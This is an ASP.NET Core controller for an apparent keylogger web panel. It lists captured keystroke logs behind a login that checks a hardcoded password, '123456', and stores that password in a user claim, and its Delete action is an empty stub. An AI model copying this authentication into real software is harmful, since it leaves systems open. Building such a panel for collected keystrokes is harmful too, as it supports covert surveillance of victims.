using KeyLoggerWEB.Models;
using KeyLoggerWEB.Repository;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Collections.Generic;
using System.Security.Claims;
using System.Threading.Tasks;

namespace KeyLoggerWEB.Controllers
{
    [Authorize]
    public class HomeController : Controller
    {
        private readonly IKeyLoggerRepository _repository;

        public HomeController(IKeyLoggerRepository keyLoggerRepository)
        {
            _repository = keyLoggerRepository;
        }

        [Route("Index")]
        public async Task<IActionResult> Index()
        {
            return View(await _repository.GetAllAsync());
        }

        [HttpGet, AllowAnonymous, Route(""), Route("Login")]
        public IActionResult Login()
        {
            if (User.Identity?.IsAuthenticated == true)
            {
                return RedirectToAction(nameof(Index));
            }

            return View();
        }

        [HttpPost("Logout")]
        public async Task<IActionResult> Logout()
        {
            await HttpContext.SignOutAsync();
            return RedirectToAction(nameof(Login));
        }

        [HttpPost("Delete/{registerID}/{logID}")]
        public async Task<IActionResult> Delete(int registerID, int logID)
        {
            return Ok();
        }

        [HttpPost("Login")]
        public async Task<IActionResult> Login(Login login)
        {
            try
            {
                if (login.Password == "123456")
                {
                    var claims = new List<Claim>
                    {
                        new Claim(ClaimTypes.Name, login.Password),
                        new Claim(ClaimTypes.Name, "Marcos Junior")
                    };

                    var identidadeDeUsuario = new ClaimsIdentity(claims, "Login");
                    ClaimsPrincipal claimsPrincipal = new ClaimsPrincipal(identidadeDeUsuario);

                    var propriedadeDeAutentificacao = new AuthenticationProperties
                    {
                        AllowRefresh = true,
                        ExpiresUtc = DateTime.Now.ToLocalTime().AddMinutes(30),
                        IsPersistent = true
                    };

                    await HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, claimsPrincipal, propriedadeDeAutentificacao);

                    return RedirectToAction(nameof(Index));
                }

                login.Message = "Senha invalida";
                return View(login);
            }
            catch (Exception)
            {
                login.Message = "Erro interno";
                return View(login);
            }
        }
    }
}
